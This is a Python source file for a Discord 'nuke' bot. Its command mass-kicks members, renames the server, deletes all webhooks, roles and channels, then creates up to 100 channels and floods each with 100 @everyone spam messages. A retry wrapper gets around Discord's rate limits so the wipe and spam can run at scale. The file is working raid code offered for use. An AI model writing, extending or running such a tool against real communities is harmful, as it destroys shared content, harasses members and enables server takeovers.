import os
import asyncio
import discord
from discord.ext import commands
import time
from collections import defaultdict

NUKE_ALIASES = ["nuke", "destroy", "wreck", "ruin", "raze", "obliterate", "demolish"]

class BucketGuard:
    def __init__(self, per_route: int = 2):
        self.per_route = per_route
        self._locks: dict[str, asyncio.Semaphore] = defaultdict(
            lambda: asyncio.Semaphore(per_route)
        )
        self._global_until = 0.0
        self._glock = asyncio.Lock()

    async def _wait_global(self):
        async with self._glock:
            now = time.monotonic()
            if self._global_until > now:
                await asyncio.sleep(self._global_until - now)

    async def trip_global(self, seconds: float):
        async with self._glock:
            self._global_until = max(self._global_until, time.monotonic() + seconds)

    async def run(self, route: str, coro_factory, *, retries: int = 6):
        sem = self._locks[route]
        for attempt in range(retries):
            await self._wait_global()
            async with sem:
                try:
                    return await coro_factory()
                except discord.HTTPException as e:
                    if e.status == 429:
                        retry_after = getattr(e, "retry_after", None) or 1.0
                        if getattr(e, "is_global", False):
                            await self.trip_global(retry_after)
                        await asyncio.sleep(retry_after + 0.1 * attempt)
                        continue
                    if e.status in (500, 502, 503, 504):
                        await asyncio.sleep(0.5 * (attempt + 1))
                        continue
                    raise
                except (discord.Forbidden, discord.NotFound):
                    raise
        raise RuntimeError(f"route {route} exhausted retries")

GUARD = BucketGuard(per_route=3)

class NukeConfirm(discord.ui.View):
    def __init__(self, author: discord.User, kick: bool):
        super().__init__(timeout=60)
        self.author = author
        self.kick = kick
        self.value: bool | None = None

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.author.id:
            await interaction.response.send_message("Not your confirm.", ephemeral=True)
            return False
        return True

    @discord.ui.button(label="CONFIRM", style=discord.ButtonStyle.danger)
    async def confirm(self, interaction: discord.Interaction, _):
        self.value = True
        await interaction.response.defer()
        self.stop()

    @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary)
    async def cancel(self, interaction: discord.Interaction, _):
        self.value = False
        await interaction.response.defer()
        self.stop()

class Nuke(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(name="nuke", aliases=NUKE_ALIASES[1:])
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def nuke(self, ctx: commands.Context, kick: str = "no"):
        guild = ctx.guild
        me = guild.me
        kick_enabled = kick.lower() == "yes"

        needed = {
            "manage_channels": me.guild_permissions.manage_channels,
            "manage_roles": me.guild_permissions.manage_roles,
            "manage_webhooks": me.guild_permissions.manage_webhooks,
            "manage_guild": me.guild_permissions.manage_guild,
        }
        if kick_enabled:
            needed["kick_members"] = me.guild_permissions.kick_members
        missing = [k for k, ok in needed.items() if not ok]
        if missing:
            return await ctx.reply(f"Missing perms: {', '.join(missing)}")

        view = NukeConfirm(ctx.author, kick_enabled)
        prompt = await ctx.reply(f"NUKE **{guild.name}**? kick: {'yes' if kick_enabled else 'no'}", view=view)
        await view.wait()
        if view.value is not True:
            return await prompt.edit(content="Cancelled.", view=None)
        await prompt.edit(view=None)

        await self._run(ctx, kick_enabled)

    async def _run(self, ctx: commands.Context, kick_enabled: bool):
        guild = ctx.guild
        author_id = ctx.author.id
        bot_id = self.bot.user.id
        owner_id = guild.owner_id

        status = await ctx.send("☢️ NUKE INITIATED")
        counts = {"kicked": 0, "channels": 0, "roles": 0, "webhooks": 0, "created": 0}
        
        if kick_enabled:
            targets = [m for m in list(guild.members) if m.id not in (bot_id, author_id, owner_id) and not m.bot]
            sem = asyncio.Semaphore(10)
            async def do_kick(m):
                async with sem:
                    try:
                        await GUARD.run(f"kick:{guild.id}", lambda: m.kick(reason="nuke"))
                        counts["kicked"] += 1
                    except Exception: pass
            await asyncio.gather(*(do_kick(m) for m in targets))

        try: await GUARD.run(f"guild_edit:{guild.id}", lambda: guild.edit(name="S҉i҉g҉g҉a҉ ҉n҉e҉x҉", reason="nuke"))
        except Exception: pass

        try:
            hooks = await GUARD.run(f"webhooks:{guild.id}", lambda: guild.fetch_webhooks())
            for wh in hooks:
                try:
                    await GUARD.run(f"webhook_delete:{wh.id}", lambda: wh.delete(reason="nuke"))
                    counts["webhooks"] += 1
                except Exception: pass
        except Exception: pass

        roles = [r for r in guild.roles if not r.is_default() and not r.managed]
        for r in roles:
            try:
                await GUARD.run(f"role_delete:{guild.id}", lambda: r.delete(reason="nuke"))
                counts["roles"] += 1
            except Exception: pass

        channels = list(guild.channels)
        keep = channels[-1] if channels else None
        for ch in channels:
            if ch == keep: continue
            try:
                await GUARD.run(f"channel_delete:{ch.id}", lambda: ch.delete(reason="nuke"))
                counts["channels"] += 1
            except Exception: pass

        spam_text = "# say 67 ┃ <@everyone> <@here> ┃ WASSUP CHAT ┃ https://tenor.com/dJqMW8ku92x.gif"

        async def make(_i):
            try:
                role = await GUARD.run(f"role_create:{guild.id}", lambda: guild.create_role(name="ʂơཞŋ ɬɛҳ", color=discord.Color.red(), reason="nuke"))
                channel = await GUARD.run(f"channel_create:{guild.id}", lambda: guild.create_text_channel(name="nuked", reason="nuke"))
                try: await GUARD.run(f"member_role:{guild.id}", lambda: ctx.author.add_roles(role))
                except Exception: pass
                for _ in range(100):
                    try: await GUARD.run(f"msg:{channel.id}", lambda: channel.send(f"@everyone\n{spam_text}", allowed_mentions=discord.AllowedMentions(everyone=True)))
                    except Exception: break
                return True
            except Exception: return False

        results = await asyncio.gather(*(make(i) for i in range(100)), return_exceptions=True)
        counts["created"] = sum(1 for r in results if r is True)
        await status.edit(content=f"☢️ COMPLETE\nKicked: {counts['kicked']}\nDeleted: {counts['channels']} ch, {counts['roles']} roles\nCreated: {counts['created']} channels")

# ==========================================
# STARTER CODE (Merged here so it runs)
# ==========================================
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="$", intents=intents, help_command=None)

@bot.event
async def on_ready():
    print(f"logged in as {bot.user} ({bot.user.id})")

async def main():
    async with bot:
        await bot.add_cog(Nuke(bot))
        await bot.start(os.environ["DISCORD_TOKEN"])

asyncio.run(main())
